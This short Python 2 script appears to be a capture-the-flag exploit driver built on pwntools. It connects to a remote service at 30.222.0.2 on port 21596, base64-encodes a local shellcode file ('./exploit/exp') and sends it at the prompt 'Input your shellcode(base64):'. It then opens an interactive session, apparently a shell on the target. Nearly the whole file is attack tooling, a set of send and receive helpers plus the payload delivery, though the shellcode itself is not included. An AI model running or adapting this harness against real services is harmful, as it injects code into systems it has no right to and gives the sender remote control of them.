#!/usr/bin/env python2
# -*- coding: utf-8 -*
import base64
from pwn import *

se = lambda data: p.send(data)
sa = lambda delim, data: p.sendafter(delim, data)
sl = lambda data: p.sendline(data)
sla = lambda delim, data: p.sendlineafter(delim, data)
sea = lambda delim, data: p.sendafter(delim, data)
rc = lambda numb=4096: p.recv(numb)
ru = lambda delims, drop=True: p.recvuntil(delims, drop)
uu32 = lambda data: u32(data.ljust(4, "\0"))
uu64 = lambda data: u64(data.ljust(8, "\0"))
lg = lambda name, data: p.success(name + ": \033[1;36m 0x%x \033[0m" % data)

p = remote("30.222.0.2", 21596)

context.log_level = "debug"

code = open("./exploit/exp").read()
code = base64.b64encode(code)
sla("Input your shellcode(base64):", code)

p.interactive()
